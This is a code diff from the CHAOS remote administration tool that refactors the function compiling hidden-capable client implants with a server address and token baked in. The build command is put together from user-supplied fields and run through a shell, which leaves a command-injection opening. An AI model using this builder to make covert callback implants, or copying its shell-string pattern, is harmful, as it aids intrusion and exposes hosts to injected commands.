@@ -12,6 +12,8 @@ import (
 	authRepo "github.com/tiagorlampert/CHAOS/repositories/auth"
 	"github.com/tiagorlampert/CHAOS/services/auth"
 	"github.com/tiagorlampert/CHAOS/services/payload"
+	"net"
+	"net/url"
 	"os/exec"
 	"strings"
 	"time"
@@ -87,25 +89,24 @@ func HandleResponse(payload *payload.Data) (*payload.Data, error) {
 }
 
 func (c clientService) BuildClient(input BuildClientBinaryInput) (string, error) {
-	if !utils.IsValidIPAddress(input.ServerAddress) &&
-		!utils.IsValidURL(input.ServerAddress) {
+	if !isValidIPAddress(input.ServerAddress) && !isValidURL(input.ServerAddress) {
 		return "", ErrInvalidServerAddress
 	}
 
-	filename, err := utils.NormalizeString(input.Filename)
+	newFilename, err := utils.NormalizeString(input.Filename)
 	if err != nil {
 		return "", err
 	}
 
-	token, err := c.GenerateNewToken()
+	newToken, err := c.GenerateNewToken()
 	if err != nil {
 		return "", err
 	}
 
 	const buildStr = `GO_ENABLED=1 GOOS=%s GOARCH=amd64 go build -ldflags '%s -s -w -X main.Version=%s -X main.ServerPort=%s -X main.ServerAddress=%s -X main.Token=%s -extldflags "-static"' -o ../temp/%s main.go`
 
-	filename = handleFilename(input.OSTarget, filename)
-	buildCmd := fmt.Sprintf(buildStr, handleOSType(input.OSTarget), runHidden(input.RunHidden), c.AppVersion, input.ServerPort, input.ServerAddress, token, filename)
+	newFilename = buildFilename(input.OSTarget, newFilename)
+	buildCmd := fmt.Sprintf(buildStr, handleOSType(input.OSTarget), runHidden(input.RunHidden), c.AppVersion, input.ServerPort, input.ServerAddress, newToken, newFilename)
 
 	cmd := exec.Command("sh", "-c", buildCmd)
 	cmd.Dir = "client/"
@@ -114,7 +115,18 @@ func (c clientService) BuildClient(input BuildClientBinaryInput) (string, error)
 	if err != nil {
 		return "", fmt.Errorf("%w:%s", err, outputErr)
 	}
-	return filename, nil
+	return newFilename, nil
+}
+
+func isValidIPAddress(s string) bool {
+	return net.ParseIP(s) != nil
+}
+
+func isValidURL(s string) bool {
+	if _, err := url.ParseRequestURI(s); err != nil {
+		return false
+	}
+	return true
 }
 
 func (c clientService) GenerateNewToken() (string, error) {
@@ -143,7 +155,7 @@ func runHidden(hidden bool) string {
 	return ""
 }
 
-func handleFilename(os system.OSType, filename string) string {
+func buildFilename(os system.OSType, filename string) string {
 	if len(strings.TrimSpace(filename)) <= 0 {
 		filename = uuid.New().String()
 	}
